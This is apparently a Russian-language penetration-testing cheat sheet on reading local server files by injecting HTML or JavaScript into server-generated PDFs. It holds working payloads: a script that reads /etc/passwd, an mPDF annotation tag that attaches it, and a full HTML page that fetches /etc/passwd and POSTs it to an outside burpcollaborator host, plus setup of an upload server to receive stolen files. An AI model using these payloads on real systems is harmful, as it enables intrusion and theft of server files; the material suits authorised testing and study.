# Local File Read via HTML injection in PDF

## About

Пусть есть возможность влиять на контент PDF. Тогда можно попробовать встроить теги (при условии поддержки JS - теги с Javascript кодом), для того, чтобы на этапе генерации PDF на стороне сервера, встроить содержимое какого-то локального файла - получаем Local File Read.&#x20;

## Exiftool: чем сгенерена PDF

```
➜ files> exiftool dok.pdf

ExifTool Version Number         : 11.85
File Name                       : dok.pdf
Directory                       : .
File Size                       : 29 kB
File Modification Date/Time     : 2020:08:19 14:42:35+03:00
File Access Date/Time           : 2020:08:19 14:45:35+03:00
File Inode Change Date/Time     : 2020:08:19 14:45:17+03:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Producer                        : iText 2.1.7 by 1T3XT
Modify Date                     : 2020:08:19 14:42:21+03:00
Create Date                     : 2020:08:19 14:42:21+03:00
```

## Анализ структуры PDF

### PDFid

PDFid - просмотр содержимого. Есть в [kali](https://tools.kali.org/forensics/pdfid).

### Peepdf

peepdf - анализ компонентов (написана на Python). Есть в kali.



## Примеры

### Пример 1

src [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

Встроить такой JS код:

```javascript
<script>
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script> 
```

### Пример 2

Встраивание тега (в любой параметр). Этой уязвимости подвержена например mPDF 6.0

```markup
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

## Tricks

## Анализ векторов, связанных с PDF-файлами

Крутая статья: [https://portswigger.net/research/portable-data-exfiltration](https://portswigger.net/research/portable-data-exfiltration)

### Поднять файловый сервер для приема файлов (File Server)

Поднять файловый сервер для загрузки файлов с уязвимой машины&#x20;

gohttpserver: [https://github.com/codeskyblue/gohttpserver](https://github.com/codeskyblue/gohttpserver) \
Use: `./gohttpserver -r ./files/ —-port 8000 —-upload`&#x20;

Далее с уязвимой тачки спокойненько шлем файлы через formdata

Пример скрипта:

```markup
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Title</title>
    </head>
    <body>
        <script>
            x=new XMLHttpRequest;
            x.onload=function() {
                    
                var formData = new FormData();
                try {
                    formData.append("file", this.response, 'test1.txt');
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "http://some.burpcollaborator.net/");
                    xhr.send(formData);
                } catch (e) {
                    document.write(e);
                }

            };
            x.open("GET","file:///etc/passwd");
            x.responseType = "blob"; // as Blob
            x.send();
            
        </script>
    </body>
</html>

```

